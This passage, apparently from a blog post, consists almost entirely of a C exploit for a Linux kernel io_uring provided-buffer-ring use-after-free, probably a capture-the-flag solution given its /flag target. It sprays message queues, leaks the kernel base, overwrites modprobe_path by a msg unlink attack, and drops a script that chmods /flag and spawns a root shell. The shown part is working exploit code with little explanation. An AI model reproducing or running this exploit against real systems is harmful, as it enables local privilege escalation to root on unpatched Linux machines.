class="line">303</span><br><span class="line">304</span><br><span class="line">305</span><br><span class="line">306</span><br><span class="line">307</span><br><span class="line">308</span><br><span class="line">309</span><br><span class="line">310</span><br><span class="line">311</span><br><span class="line">312</span><br><span class="line">313</span><br><span class="line">314</span><br><span class="line">315</span><br><span class="line">316</span><br><span class="line">317</span><br><span class="line">318</span><br><span class="line">319</span><br><span class="line">320</span><br><span class="line">321</span><br><span class="line">322</span><br><span class="line">323</span><br><span class="line">324</span><br><span class="line">325</span><br><span class="line">326</span><br><span class="line">327</span><br><span class="line">328</span><br><span class="line">329</span><br><span class="line">330</span><br><span class="line">331</span><br><span class="line">332</span><br><span class="line">333</span><br><span class="line">334</span><br><span class="line">335</span><br><span class="line">336</span><br><span class="line">337</span><br><span class="line">338</span><br><span class="line">339</span><br><span class="line">340</span><br><span class="line">341</span><br><span class="line">342</span><br><span class="line">343</span><br><span class="line">344</span><br><span class="line">345</span><br><span class="line">346</span><br><span class="line">347</span><br><span class="line">348</span><br><span class="line">349</span><br><span class="line">350</span><br><span class="line">351</span><br><span class="line">352</span><br><span class="line">353</span><br><span class="line">354</span><br><span class="line">355</span><br><span class="line">356</span><br><span class="line">357</span><br><span class="line">358</span><br><span class="line">359</span><br><span class="line">360</span><br><span class="line">361</span><br><span class="line">362</span><br><span class="line">363</span><br><span class="line">364</span><br><span class="line">365</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> _GNU_SOURCE</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sched.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/prctl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;linux/io_uring.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdatomic.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&quot;kernelpwn.h&quot;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> MSG_QUEUE_NUM 0x10</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> PAGE_SIZE 0x1000</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> BUFFER_LEN (PAGE_SIZE * 8)</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> PBUF_BASE ((void*)0x1000)</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> IORING_REGISTER_PBUF_RING (22)</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> IORING_UNREGISTER_PBUF_RING (23)</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> IORING_OP_PROVIDE_BUFFERS (31)</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//内存屏障宏</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> io_uring_smp_store_release(p, v)                   \</span></span><br><span class="line"><span class="meta">    atomic_store_explicit((_Atomic typeof(*(p))*)(p), (v), \</span></span><br><span class="line"><span class="meta">        memory_order_release)</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> io_uring_smp_load_acquire(p)                 \</span></span><br><span class="line"><span class="meta">    atomic_load_explicit((_Atomic typeof(*(p))*)(p), \</span></span><br><span class="line"><span class="meta">        memory_order_acquire)</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">io_uring_buf_reg</span> &#123;</span></span><br><span class="line">    __u64 ring_addr;</span><br><span class="line">    __u32 ring_entries;</span><br><span class="line">    __u16 bgid;</span><br><span class="line">    __u16 pad;</span><br><span class="line">    __u64 resv[<span class="number">3</span>];</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">new_io_uring_sqe</span> &#123;</span></span><br><span class="line">	__u8	opcode;		<span class="comment">/* type of operation for this sqe */</span></span><br><span class="line">	__u8	flags;		<span class="comment">/* IOSQE_ flags */</span></span><br><span class="line">	__u16	ioprio;		<span class="comment">/* ioprio for the request */</span></span><br><span class="line">	__s32	fd;		<span class="comment">/* file descriptor to do IO on */</span></span><br><span class="line">	<span class="class"><span class="keyword">union</span> &#123;</span></span><br><span class="line">		__u64	off;	<span class="comment">/* offset into file */</span></span><br><span class="line">		__u64	addr2;</span><br><span class="line">	&#125;;</span><br><span class="line">	<span class="class"><span class="keyword">union</span> &#123;</span></span><br><span class="line">		__u64	addr;	<span class="comment">/* pointer to buffer or iovecs */</span></span><br><span class="line">		__u64	splice_off_in;</span><br><span class="line">	&#125;;</span><br><span class="line">	__u32	len;		<span class="comment">/* buffer size or number of iovecs */</span></span><br><span class="line">	<span class="class"><span class="keyword">union</span> &#123;</span></span><br><span class="line">		<span class="keyword">__kernel_rwf_t</span>	rw_flags;</span><br><span class="line">		__u32		fsync_flags;</span><br><span class="line">		__u16		poll_events;	<span class="comment">/* compatibility */</span></span><br><span class="line">		__u32		poll32_events;	<span class="comment">/* word-reversed for BE */</span></span><br><span class="line">		__u32		sync_range_flags;</span><br><span class="line">		__u32		msg_flags;</span><br><span class="line">		__u32		timeout_flags;</span><br><span class="line">		__u32		accept_flags;</span><br><span class="line">		__u32		cancel_flags;</span><br><span class="line">		__u32		open_flags;</span><br><span class="line">		__u32		statx_flags;</span><br><span class="line">		__u32		fadvise_advice;</span><br><span class="line">		__u32		splice_flags;</span><br><span class="line">		__u32		rename_flags;</span><br><span class="line">		__u32		unlink_flags;</span><br><span class="line">		__u32		hardlink_flags;</span><br><span class="line">	&#125;;</span><br><span class="line">	__u64	user_data;	<span class="comment">/* data to be passed back at completion time */</span></span><br><span class="line">	<span class="comment">/* pack this to avoid bogus arm OABI complaints */</span></span><br><span class="line">	<span class="class"><span class="keyword">union</span> &#123;</span></span><br><span class="line">		<span class="comment">/* index into fixed buffers, if used */</span></span><br><span class="line">		__u16	buf_index;</span><br><span class="line">		<span class="comment">/* for grouped buffer selection */</span></span><br><span class="line">		__u16	buf_group;</span><br><span class="line">	&#125; __attribute__((packed));</span><br><span class="line">	<span class="comment">/* personality to use, if used */</span></span><br><span class="line">	__u16	personality;</span><br><span class="line">	<span class="class"><span class="keyword">union</span> &#123;</span></span><br><span class="line">		__s32	splice_fd_in;</span><br><span class="line">		__u32	file_index;</span><br><span class="line">	&#125;;</span><br><span class="line">	__u64	__pad2[<span class="number">2</span>];</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">int</span> uring_fd;</span><br><span class="line"><span class="keyword">char</span>* buffer;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">new_io_uring_sqe</span>* <span class="title">sqes</span>;</span> </span><br><span class="line"><span class="keyword">unsigned</span> *sring_tail, *sring_mask, *sring_array, *cring_head;</span><br><span class="line"><span class="keyword">int</span> msgid[MSG_QUEUE_NUM];</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span>* <span class="title">worker</span><span class="params">(<span class="keyword">void</span>* res)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    msgrcv(msgid[<span class="number">0</span>], res, PAGE_SIZE, (<span class="keyword">long</span>)PBUF_BASE, <span class="number">0</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;shouldn&#x27;t get here&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span>* <span class="title">do_mmap</span><span class="params">(<span class="keyword">void</span>* base, <span class="keyword">size_t</span> len)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> flags = MAP_ANONYMOUS | MAP_PRIVATE;</span><br><span class="line">    <span class="keyword">if</span> (base)</span><br><span class="line">        flags |= MAP_FIXED;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">void</span>* res = mmap(base, len, PROT_READ | PROT_WRITE, flags, <span class="number">-1</span>, <span class="number">0</span>);</span><br><span class="line">    <span class="keyword">if</span> ((<span class="keyword">size_t</span>)res == <span class="number">-1</span> || (base &amp;&amp; (res != base))) &#123;</span><br><span class="line">        err_exit(<span class="string">&quot;mmap&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">memset</span>(res, <span class="string">&#x27;\x00&#x27;</span>, len);</span><br><span class="line">    <span class="keyword">return</span> res;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">io_uring_setup</span><span class="params">(<span class="keyword">unsigned</span> entries, struct io_uring_params* p)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> (<span class="keyword">int</span>)syscall(__NR_io_uring_setup, entries, p);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">io_uring_register</span><span class="params">(<span class="keyword">unsigned</span> <span class="keyword">int</span> fd, <span class="keyword">unsigned</span> <span class="keyword">int</span> opcode,</span></span></span><br><span class="line"><span class="params"><span class="function">    <span class="keyword">void</span>* arg, <span class="keyword">unsigned</span> <span class="keyword">int</span> nr_args)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> (<span class="keyword">int</span>)syscall(__NR_io_uring_register, fd, opcode, arg, nr_args);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">io_uring_enter</span><span class="params">(<span class="keyword">int</span> ring_fd, <span class="keyword">unsigned</span> <span class="keyword">int</span> to_submit, <span class="keyword">unsigned</span> <span class="keyword">int</span> min_complete, <span class="keyword">unsigned</span> <span class="keyword">int</span> flags)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> (<span class="keyword">int</span>)syscall(__NR_io_uring_enter, ring_fd, to_submit, min_complete, flags, <span class="literal">NULL</span>, <span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">submit_provide_buffer</span><span class="params">(<span class="keyword">void</span>)</span></span>&#123;</span><br><span class="line">    io_uring_smp_store_release(&amp;sring_array[<span class="number">0</span>], <span class="number">0</span>); </span><br><span class="line"></span><br><span class="line">    <span class="keyword">int</span> tail = *sring_tail;</span><br><span class="line">    tail++;</span><br><span class="line">    io_uring_smp_store_release(sring_tail, tail);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">int</span> ret = io_uring_enter(uring_fd, <span class="number">1</span>, <span class="number">1</span>, IORING_ENTER_GETEVENTS);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">int</span> head = io_uring_smp_load_acquire(cring_head);</span><br><span class="line">    head++;</span><br><span class="line">    io_uring_smp_store_release(cring_head, head);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">init_io_uring</span><span class="params">(<span class="keyword">void</span>)</span></span>&#123; <span class="comment">/* kmalloc-2k */</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">io_uring_params</span> <span class="title">p</span> =</span> &#123;<span class="number">0</span>&#125;;</span><br><span class="line"></span><br><span class="line">    uring_fd = io_uring_setup(<span class="number">0x1</span>, &amp;p); </span><br><span class="line">    <span class="keyword">int</span> sring_sz = p.sq_off.<span class="built_in">array</span> + p.sq_entries * <span class="keyword">sizeof</span>(<span class="keyword">unsigned</span>);</span><br><span class="line">    <span class="keyword">int</span> cring_sz = p.cq_off.cqes + p.cq_entries * <span class="keyword">sizeof</span>(struct io_uring_cqe);</span><br><span class="line">    <span class="keyword">int</span> sqes_sz = p.sq_entries * <span class="keyword">sizeof</span>(struct new_io_uring_sqe);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">char</span>* sq_ptr = mmap(<span class="literal">NULL</span>, sring_sz, PROT_READ | PROT_WRITE, MAP_SHARED, uring_fd, IORING_OFF_SQ_RING);</span><br><span class="line"></span><br><span class="line">    sring_tail = (<span class="keyword">unsigned</span> <span class="keyword">int</span>*)(sq_ptr + p.sq_off.tail); </span><br><span class="line">    sring_mask = (<span class="keyword">unsigned</span> <span class="keyword">int</span>*)(sq_ptr + p.sq_off.ring_mask); </span><br><span class="line">    sring_array = (<span class="keyword">unsigned</span> <span class="keyword">int</span>*)(sq_ptr + p.sq_off.<span class="built_in">array</span>); </span><br><span class="line"></span><br><span class="line">    sqes = mmap(<span class="literal">NULL</span>, sqes_sz, PROT_READ | PROT_WRITE, MAP_SHARED, uring_fd, IORING_OFF_SQES); <span class="comment">/* 提交队列项 */</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">char</span>* cq_ptr = mmap(<span class="literal">NULL</span>, cring_sz, PROT_READ | PROT_WRITE, MAP_SHARED, uring_fd, IORING_OFF_CQ_RING);</span><br><span class="line"></span><br><span class="line">    cring_head = (<span class="keyword">unsigned</span> <span class="keyword">int</span>*)(cq_ptr + p.cq_off.head); </span><br><span class="line"></span><br><span class="line">    buffer = do_mmap(<span class="number">0</span>, BUFFER_LEN);</span><br><span class="line">    <span class="keyword">if</span> (buffer == <span class="literal">NULL</span>) &#123;</span><br><span class="line">        err_exit(<span class="string">&quot;malloc buffer&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">do_free_first</span><span class="params">(<span class="keyword">void</span>)</span> </span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> ret;</span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">io_uring_buf_reg</span> <span class="title">reg</span>;</span></span><br><span class="line">    <span class="built_in">memset</span>(&amp;reg, <span class="number">0</span>, <span class="keyword">sizeof</span>(reg));</span><br><span class="line">    reg.ring_addr = <span class="number">0xF00000000</span>; </span><br><span class="line">    reg.ring_entries = <span class="number">0x20000000</span>; </span><br><span class="line">    reg.bgid = <span class="number">0x0</span>;</span><br><span class="line"></span><br><span class="line">    ret = io_uring_register(uring_fd, IORING_REGISTER_PBUF_RING, &amp;reg, <span class="number">1</span>);</span><br><span class="line">    <span class="keyword">return</span> ret;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * skb_shared_info need to take 320 bytes at the tail</span></span><br><span class="line"><span class="comment"> * so the max size of buf we should send is:</span></span><br><span class="line"><span class="comment"> * 2048 - 320*2 = 1408</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">char</span> fake_secondary_msg[<span class="number">1408</span>];</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc , <span class="keyword">char</span> **argv, <span class="keyword">char</span> **envp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> ret;</span><br><span class="line">    <span class="keyword">int</span> sk_sockets[SOCKET_NUM][<span class="number">2</span>];</span><br><span class="line">    <span class="keyword">int</span> socket_fd;</span><br><span class="line">    <span class="keyword">uint64_t</span> victim_addr;</span><br><span class="line">    <span class="keyword">uint64_t</span> victim_qid;</span><br><span class="line"></span><br><span class="line">    save_status();</span><br><span class="line">    unshare_setup();</span><br><span class="line"></span><br><span class="line">    init_io_uring();</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; MSG_QUEUE_NUM; i++)&#123;</span><br><span class="line">        <span class="keyword">if</span> ((msgid[i] = msgget((<span class="keyword">key_t</span>)<span class="number">1234</span> + i, <span class="number">0666</span> | IPC_CREAT | IPC_EXCL)) &lt; <span class="number">0</span>)</span><br><span class="line">            err_exit(<span class="string">&quot;failed to create msg_queue!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    do_free_first();</span><br><span class="line">    </span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;try to get UAF object&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">msgbuf</span>* <span class="title">msg</span> =</span> (struct msgbuf*)buffer;</span><br><span class="line">    <span class="keyword">int</span> msg_len = <span class="number">0x420</span> - <span class="number">0x30</span>;</span><br><span class="line">    msg-&gt;mtype = <span class="number">0x0001</span>; </span><br><span class="line">    <span class="built_in">memset</span>(msg-&gt;mtext, <span class="string">&#x27;\x00&#x27;</span>, msg_len);</span><br><span class="line">    msgsnd(msgid[<span class="number">0</span>], msg, msg_len, <span class="number">0</span>); </span><br><span class="line"></span><br><span class="line">    <span class="keyword">void</span>* pbuf = do_mmap(PBUF_BASE, PAGE_SIZE); </span><br><span class="line">    sqes-&gt;opcode = IORING_OP_PROVIDE_BUFFERS;</span><br><span class="line">    sqes-&gt;rw_flags = <span class="number">0</span>;</span><br><span class="line">    sqes-&gt;splice_fd_in = <span class="number">0</span>;</span><br><span class="line">    sqes-&gt;fd = <span class="number">1</span>; </span><br><span class="line">    sqes-&gt;addr = (<span class="keyword">uint64_t</span>)pbuf; </span><br><span class="line">    sqes-&gt;len = <span class="number">0xFD0</span>; </span><br><span class="line">    sqes-&gt;buf_group = <span class="number">0</span>;</span><br><span class="line">    submit_provide_buffer();</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; <span class="number">0x2</span>; i++) &#123;</span><br><span class="line">        sqes-&gt;addr = (<span class="keyword">uint64_t</span>)<span class="built_in">malloc</span>(<span class="number">0x100</span>);</span><br><span class="line">        sqes-&gt;len = <span class="number">0x100</span>;</span><br><span class="line">        sqes-&gt;buf_group = <span class="number">0x21</span>; </span><br><span class="line">        submit_provide_buffer();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;submit_provide_buffer&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">uint64_t</span>* tag = (<span class="keyword">uint64_t</span>*)(buffer + <span class="number">0xF00</span>);</span><br><span class="line">    *tag = <span class="number">0xdeadbeef</span>;</span><br><span class="line">    <span class="keyword">pthread_t</span> th;</span><br><span class="line">    pthread_create(&amp;th, <span class="literal">NULL</span>, worker, buffer);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span> (*tag == <span class="number">0xdeadbeef</span>)&#123;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//print_hex(buffer,0xf80);</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">uint64_t</span> io_bl = *((<span class="keyword">uint64_t</span>*)(buffer + <span class="number">0x18</span>)) - <span class="number">0x420</span>; </span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;io_bl = 0x%lx\n&quot;</span>,io_bl);</span><br><span class="line"></span><br><span class="line">    msg_len = <span class="number">0x800</span> - <span class="number">0x30</span>;</span><br><span class="line">    <span class="built_in">memset</span>(msg-&gt;mtext, <span class="number">0x00</span>, msg_len);</span><br><span class="line">    msgsnd(msgid[<span class="number">2</span>], msg, msg_len, <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">int</span> spray_uring_fd;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">io_uring_params</span> <span class="title">p</span>;</span></span><br><span class="line">    <span class="built_in">memset</span>(&amp;p, <span class="number">0</span>, <span class="keyword">sizeof</span>(p));</span><br><span class="line">    spray_uring_fd = io_uring_setup(<span class="number">0x1</span>, &amp;p);</span><br><span class="line"></span><br><span class="line">    ret = msgrcv(msgid[<span class="number">0</span>], buffer, PAGE_SIZE, (<span class="keyword">long</span>)<span class="number">0x0001</span>, <span class="number">0</span>); </span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> IDX(x) (((x)-0x30) / 8)</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">uint64_t</span>* tmp = (<span class="keyword">uint64_t</span>*)msg-&gt;mtext; </span><br><span class="line">    tmp[IDX(<span class="number">0x40</span>)] = io_bl + <span class="number">0x60</span>;</span><br><span class="line">    tmp[IDX(<span class="number">0x48</span>)] = io_bl; </span><br><span class="line">    tmp[IDX(<span class="number">0x50</span>)] = <span class="number">0x10000</span>;</span><br><span class="line">    tmp[IDX(<span class="number">0x60</span>)] = io_bl + <span class="number">0x68</span>;</span><br><span class="line">    tmp[IDX(<span class="number">0x68</span>)] = <span class="number">0xdeadbeef</span>;</span><br><span class="line"></span><br><span class="line">    tmp[IDX(<span class="number">0x80</span>)] = io_bl + <span class="number">0xa0</span>; </span><br><span class="line">    tmp[IDX(<span class="number">0x88</span>)] = io_bl; </span><br><span class="line">    tmp[IDX(<span class="number">0x90</span>)] = <span class="number">0x10000</span>; </span><br><span class="line">    tmp[IDX(<span class="number">0xa0</span>)] = io_bl + <span class="number">0x1000</span>; </span><br><span class="line"></span><br><span class="line">    msg_len = <span class="number">0x800</span> - <span class="number">0x30</span>; </span><br><span class="line">    ret = msgsnd(msgid[<span class="number">1</span>], msg, msg_len, <span class="number">0</span>); </span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">io_uring_buf_reg</span> <span class="title">reg</span>;</span></span><br><span class="line">    <span class="built_in">memset</span>(&amp;reg, <span class="number">0</span>, <span class="keyword">sizeof</span>(reg));</span><br><span class="line">    reg.bgid = <span class="number">0x2</span>;</span><br><span class="line">    ret = io_uring_register(uring_fd, IORING_UNREGISTER_PBUF_RING, &amp;reg, <span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">    tmp = (<span class="keyword">uint64_t</span>*)msg-&gt;mtext;</span><br><span class="line">    tmp[IDX(<span class="number">0x420</span> - <span class="number">0x60</span>)] = io_bl + <span class="number">0x420</span>; </span><br><span class="line"></span><br><span class="line">    tmp[IDX(<span class="number">0x800</span> - <span class="number">0x60</span>)] = io_bl + <span class="number">0x830</span>; </span><br><span class="line">    tmp[IDX(<span class="number">0x808</span> - <span class="number">0x60</span>)] = io_bl + <span class="number">0x830</span>; </span><br><span class="line">    tmp[IDX(<span class="number">0x810</span> - <span class="number">0x60</span>)] = <span class="number">0x00001</span>; </span><br><span class="line">    tmp[IDX(<span class="number">0x818</span> - <span class="number">0x60</span>)] = <span class="number">0xFD0</span>;</span><br><span class="line">    tmp[IDX(<span class="number">0x820</span> - <span class="number">0x60</span>)] = <span class="number">0</span>; </span><br><span class="line">    tmp[IDX(<span class="number">0x828</span> - <span class="number">0x60</span>)] = io_bl + <span class="number">0x840</span>; </span><br><span class="line">    tmp[IDX(<span class="number">0x830</span> - <span class="number">0x60</span>)] = io_bl + <span class="number">0x800</span>;</span><br><span class="line">    tmp[IDX(<span class="number">0x838</span> - <span class="number">0x60</span>)] = io_bl + <span class="number">0x800</span>;</span><br><span class="line">    tmp[IDX(<span class="number">0x840</span> - <span class="number">0x60</span>)] = <span class="number">0xdeadbeef</span>;</span><br><span class="line"></span><br><span class="line">    msg_len = <span class="number">0x800</span> - <span class="number">0x30</span>;</span><br><span class="line">    ret = msgsnd(msgid[<span class="number">3</span>], msg, msg_len, <span class="number">0</span>); </span><br><span class="line"></span><br><span class="line">    msgrcv(msgid[<span class="number">2</span>], buffer, PAGE_SIZE, (<span class="keyword">long</span>)<span class="number">0x0001</span>, <span class="number">0</span>);</span><br><span class="line">    <span class="keyword">uint64_t</span>* io_ring_ctx = (<span class="keyword">uint64_t</span>*)(buffer + <span class="number">0x8</span> + <span class="number">0x800</span> - <span class="number">0x30</span>);</span><br><span class="line">    <span class="comment">//print_hex(io_ring_ctx, 0x200);</span></span><br><span class="line"></span><br><span class="line">    kernel_offset = io_ring_ctx[<span class="number">0x420</span> / <span class="number">8</span>] - <span class="number">0xffffffff810a8470</span>;</span><br><span class="line">    kernel_base = kernel_offset + <span class="number">0xffffffff81000000</span>;</span><br><span class="line">    <span class="keyword">uint64_t</span> modprobe_path = kernel_offset + <span class="number">0xFFFFFFFF82E51260</span>;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;io_ring_ctx-&gt;fallback_work: 0x%lx\n&quot;</span>,io_ring_ctx[<span class="number">0x420</span> / <span class="number">8</span>]);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;kernel_offset: 0x%lx\n&quot;</span>,kernel_offset);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;kernel_base: 0x%lx\n&quot;</span>,kernel_base);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;modprobe_path: 0x%lx\n&quot;</span>,modprobe_path);</span><br><span class="line"></span><br><span class="line">    msg_len = <span class="number">0x800</span> - <span class="number">0x30</span>;</span><br><span class="line">    <span class="built_in">memset</span>(msg-&gt;mtext, <span class="string">&#x27;a&#x27;</span>, msg_len);</span><br><span class="line">    msgsnd(msgid[<span class="number">4</span>], msg, msg_len, <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">    ret = msgrcv(msgid[<span class="number">3</span>], buffer, msg_len, <span class="comment">/* msg_type= */</span> (<span class="keyword">long</span>)<span class="number">0x0001</span>, <span class="number">0</span>);</span><br><span class="line">    </span><br><span class="line">    tmp = (<span class="keyword">uint64_t</span>*)msg-&gt;mtext;</span><br><span class="line">    tmp[IDX(<span class="number">0x420</span> - <span class="number">0x60</span>)] = io_bl + <span class="number">0x420</span>; </span><br><span class="line"></span><br><span class="line">    tmp[IDX(<span class="number">0x800</span> - <span class="number">0x60</span>)] = modprobe_path - <span class="number">0x8</span>; </span><br><span class="line">    tmp[IDX(<span class="number">0x808</span> - <span class="number">0x60</span>)] = <span class="number">0x612f706d742f</span>; </span><br><span class="line">    tmp[IDX(<span class="number">0x810</span> - <span class="number">0x60</span>)] = <span class="number">0x00001</span>; </span><br><span class="line">    tmp[IDX(<span class="number">0x818</span> - <span class="number">0x60</span>)] = <span class="number">0xFD0</span>;</span><br><span class="line">    tmp[IDX(<span class="number">0x820</span> - <span class="number">0x60</span>)] = <span class="number">0</span>; </span><br><span class="line">    tmp[IDX(<span class="number">0x828</span> - <span class="number">0x60</span>)] = io_bl + <span class="number">0x840</span>;</span><br><span class="line"></span><br><span class="line">    msg_len = <span class="number">0x800</span> - <span class="number">0x30</span>;</span><br><span class="line">    msgsnd(msgid[<span class="number">5</span>], msg, msg_len, <span class="number">0</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;try to msg unlink attack&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (fork() == <span class="number">0</span>) &#123; </span><br><span class="line">        msgrcv(msgid[<span class="number">4</span>], buffer, PAGE_SIZE, <span class="comment">/* msg_type= */</span> (<span class="keyword">long</span>)<span class="number">0x0001</span>, <span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    sleep(<span class="number">2</span>);</span><br><span class="line">    <span class="keyword">int</span> fd = open(<span class="string">&quot;/proc/sys/kernel/modprobe&quot;</span>, O_RDONLY);</span><br><span class="line">    read(fd, buffer, <span class="number">0x10</span>);</span><br><span class="line">    <span class="built_in">puts</span>(buffer);</span><br><span class="line">    close(fd);</span><br><span class="line"></span><br><span class="line">    fd = open(<span class="string">&quot;/tmp/a&quot;</span>, O_RDWR|O_CREAT);</span><br><span class="line">    <span class="keyword">char</span> *script = <span class="string">&quot;#!/bin/sh\nchmod 777 /flag\nsetsid cttyhack setuidgid 0 /bin/sh\n&quot;</span>;</span><br><span class="line">    write(fd, script, <span class="built_in">strlen</span>(script));</span><br><span class="line">    close(fd);</span><br><span class="line">    system(<span class="string">&quot;chmod 777 /tmp/a&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">int</span> ff = open(<span class="string">&quot;/tmp/asd&quot;</span>, O_WRONLY | O_CREAT);</span><br><span class="line">    write(ff, <span class="string">&quot;\xff\xff\xff\xff&quot;</span>, <span class="number">4</span>);</span><br><span class="line">    close(ff);</span><br><span class="line"></span><br><span class="line">    system(<span class="string">&quot;chmod 777 /tmp/asd; /tmp/asd&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span>(fork()==<span class="number">0</span>)</span><br><span class="line">        system(<span class="string">&quot;/bin/sh&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;alive&quot;</span>);</span><br><span class="line">    <span class="keyword">while</span> (<span class="number">1</span>)</span><br><span class="line">        ;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
